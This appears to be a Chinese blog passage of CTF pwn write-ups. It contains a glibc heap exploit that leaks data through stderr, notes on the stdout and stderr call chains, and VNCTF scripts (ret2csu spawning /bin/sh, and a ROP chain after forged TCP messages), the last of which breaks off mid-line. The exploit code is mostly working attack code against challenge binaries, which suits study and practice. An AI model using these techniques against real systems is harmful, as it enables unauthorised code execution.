<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,context</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Content:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendafter(<span class="string">&#x27;Choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x14b0</span>)<span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x40</span>)<span class="comment">#1-7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x50</span>)<span class="comment">#8-14</span></span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#15</span></span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#16</span></span><br><span class="line">    add(<span class="number">0x120</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x440</span>)<span class="comment">#18</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">15</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#1-&gt;15</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">15</span>)</span><br><span class="line">        edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#fast-&gt;0x1eeb80     stderr-&gt;0x1ec5c0   </span></span><br><span class="line">    add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0xe0</span>)<span class="comment">#3</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x80\xcb&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#5-&gt;16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">16</span>)</span><br><span class="line">        edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0xe0</span>)<span class="comment">#7</span></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;\xc0\xa5&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#8</span></span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)<span class="comment">#10</span></span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x430</span>+p64(<span class="number">0</span>)+p64(<span class="number">123</span>))</span><br><span class="line">    add(<span class="number">0x100</span>)<span class="comment">#11</span></span><br><span class="line">    edit(<span class="number">11</span>,p64(<span class="number">0x7fffffffffff</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x110</span>)<span class="comment">#0</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    edit(<span class="number">11</span>,p64(<span class="number">0x80</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    add(<span class="number">0x888</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>感觉对其中的调用链很模糊，再研究研究</p>
<h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h2><p>之前能使用stdout进行leak最主要的原因是puts函数调用了<code>_IO_file_xsputn</code>函数，而<code>_IO_file_xsputn</code>函数会最终会调用<code>io_overflow</code>函数，<code>io_overflow</code>函数最后又会调用<code>io_do_write</code>函数，<code>io_do_write</code>函数又会调用<code>new_do_write</code></p>
<p>注意上面的调用链是一定的，调用<code>_IO_file_xsputn</code>函数以后最后一定会调用<code>new_do_write</code>函数，而<code>new_do_wirte</code>函数就是我们要利用的地方</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span></span></span><br><span class="line"><span class="function">_IO_size_t</span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">//最终输出 </span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意有个write的系统调用，把data输出到fp，fp如果是stdout或者是stderr，那就相当于把data输出到屏幕，之前对flag的设置就是为了<code>new_do_write</code>函数能走到<code>_IO_SYSWRITE (fp, data, to_do)</code></p>
<p>这道题之所以不能用stdout是因为输出函数是write函数，没有调用<code>_IO_file_xsputn</code>函数</p>
<h2 id="stderr"><a href="#stderr" class="headerlink" title="stderr"></a>stderr</h2><p>经过gdb的调试我找见了脚本最后的调用链<code>malloc-&gt;_int_malloc-&gt;sysmalloc-&gt;__malloc_assert-&gt;__fxprintf-&gt;buffered_vfprintf-&gt;_IO_file_xsputn</code>,这就和上面的stdout泄露的调用链连上了，虽然找见了调用链但是过程不是很清晰，和houseofkiwi扯上关系了，以后再学习叭，现在夜深了。</p>
<p>我找见了进入<code>__malloc_assert</code>函数的源码,其中刷新stderr是利用的<code>__fxprintf</code>,<code>house of kiwi</code>使用的是<code>fflush(stderr)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __assert_fail(assertion, file, <span class="meta-keyword">line</span>, function)			\</span></span><br><span class="line"><span class="meta">	 __malloc_assert(assertion, file, <span class="meta-keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__malloc_assert (<span class="keyword">const</span> <span class="keyword">char</span> *assertion, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> line,</span><br><span class="line">		 <span class="keyword">const</span> <span class="keyword">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="keyword">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了会<code>house of kiwi</code>不算很难，可以专门学习一波。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当没有puts函数的时候，可以使用这个方法刷新srderr泄露信息，注意这种利用方式会导致程序退出，不适合泄露libc地址（除非没开aslr）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/VNCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/02/VNCTF/" class="post-title-link" itemprop="url">VNCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 20:18:05 / 修改时间：20:18:35" itemprop="dateCreated datePublished" datetime="2022-03-02T20:18:05+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="vnctf"><a href="#vnctf" class="headerlink" title="vnctf"></a>vnctf</h1><h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><p>刚开始泄露libc地址算基地址猜版本号本地能打通，远程不行，看了wp发现用了csu,自己复现时发现<code>call [r12+rbx*8]</code>这段代码不好搞，wp也很巧妙，使用了bss上面的一个地址（能读的也只有bss段，是我疏忽了，思路挺好想到的），最后我的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,26251)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x400762&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///&#x27;</span>)</span><br><span class="line">    syscall_addr=<span class="number">0x000000000040077e</span></span><br><span class="line">    bss_addr=<span class="number">0x601000</span></span><br><span class="line">    gadget1=<span class="number">0x4007EA</span></span><br><span class="line">    gadget2=<span class="number">0x4007D0</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(gadget1)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(<span class="number">0x600e40</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0x3b</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(syscall_addr)</span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    m=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)</span><br><span class="line">    m=m.ljust(<span class="number">0x3b</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    sh.send(m)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#flag&#123;0f3a2cff-55bb-4517-a7f9-d91daf946d32&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>tcp服务的模拟，他会检查上传的tcp报文的格式，传数据的时候得绕过这个检查，然后会把传上来的数据拷贝到栈上，造成了栈溢出，远程环境很容易崩，多试几次，这也是我比赛期间内唯一做出来的题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28714</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">main_addr=<span class="number">0x401A5E</span></span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000401bb3: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401bb1: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">0x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000032b5a: pop rsp; ret;</span></span><br><span class="line"><span class="string">0x0000000000043ae8: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000001b96: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x00000000000d2745: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000003960: pop rsp; ret; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401bb3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401bb1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sumbit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Which?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v5_again</span>(<span class="params">v5,string</span>):</span></span><br><span class="line">    i=<span class="built_in">len</span>(string)</span><br><span class="line">    m=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(m&lt;=i-<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> m==<span class="number">16</span>:</span><br><span class="line">            m+=<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s=<span class="built_in">ord</span>(string[m])+(<span class="built_in">ord</span>(string[m+<span class="number">1</span>])&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        v5=v5^s</span><br><span class="line">        m+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> v5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_context</span>(<span class="params">v6,i,context</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    tcp_message=p16(<span class="number">0x766e</span>) <span class="comment">#0</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0x28b7</span>) <span class="comment">#2</span></span><br><span class="line">    tcp_message+=p32(v6) <span class="comment">#4</span></span><br><span class="line">    tcp_message+=p32(<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">    tcp_message+=p16(i) <span class="comment">#12</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0</span>) <span class="comment">#18</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0xffff</span>)<span class="comment">#22</span></span><br><span class="line">    tcp_message+=context</span><br><span class="line">    tcp_message=tcp_message.ljust(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    v5=get_v5_again(<span class="number">0x140b</span>,tcp_message)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(v5)</span><br><span class="line">    real_tcp_message=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tcp_message)):</span><br><span class="line">        <span class="keyword">if</span> i ==<span class="number">16</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>(v5&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">17</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>((v5&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        real_tcp_message+=tcp_message[i]</span><br><span class="line">    sleep(<span class="number">7</span>)</span><br><span class="line">    sh.send(real_tcp_message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x401A5D&#x27;)</span></span><br><span class="line">    v5=<span class="number">5131</span></span><br><span class="line">    tcp_context(<span class="number">1</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)+p64(main_addr)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">    pop_rsp=libc_base+<span class="number">0x0000000000032b5a</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rax)+p64(<span 